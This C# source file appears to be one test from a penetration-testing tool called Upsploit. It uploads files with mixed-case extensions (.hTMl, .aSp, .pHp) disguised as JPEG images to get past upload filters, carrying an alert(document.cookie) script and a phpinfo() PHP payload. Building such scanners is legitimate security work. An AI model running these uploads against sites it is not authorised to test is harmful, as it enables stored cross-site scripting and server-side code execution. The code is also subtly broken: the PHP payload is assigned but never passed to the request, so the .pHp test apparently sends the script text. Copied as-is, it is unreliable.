using System.Text;
using System.Threading.Tasks;

/*
* Test #4
* Description: This test tries to upload files with randomly cased extensions.
* This will evade any filters looking for extensions in a single case.
*/
namespace Upsploit.Tests {
    class Test04 : Test {
        public override sealed string description { get; set; }
        public override sealed string validation { get; set; }

        public Test04() {
            description = "This test uploads several files with the MIME type \"image/jpeg\". The files are \"Test_4.hTMl\", \"Test_4.aSp\" and \"Test_4.pHp\"." +
                          "\r\n\r\n" +
                          "The test will work on websites that are blacklisting extensions in a case-insensitive way.";

            validation = "Look for \"Test_4.hTMl\", \"Test_4.aSp\" and/or \"Test_4.pHp\" on the web application. " +
                         "If the file loads any of these pages and displays an alert, the test was a success and the web application is vulnerable.\r\n\r\n" +
                         "If the webpage no longer has the correct extension or it doesn't render in the browser, the test failed.";
        }

        internal override async Task runTest(UploadRequest.UploadRequest request) {
            string data = "<script>alert(document.cookie)</script>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg"); //Default all files to image/jpeg

            //HTML case sensitivity test
            request.setFileName("Test_4" + ".hTMl");
            await request.send();
            printResult(request, "Test 04 (.hTMl)");

            //ASP case sensitivity test
            request.setFileName("Test_4" + ".aSp");
            await request.send();
            printResult(request, "Test 04 (.aSp)");

            //Change contents for php test
            data = "<?php\n"
                 + "  echo phpinfo();\n"
                 + "?>";
            //PHP case sensitivity test
            request.setFileName("Test_4" + ".pHp");
            await request.send();
            printResult(request, "Test 04 (.pHp)");
        }
    }
}
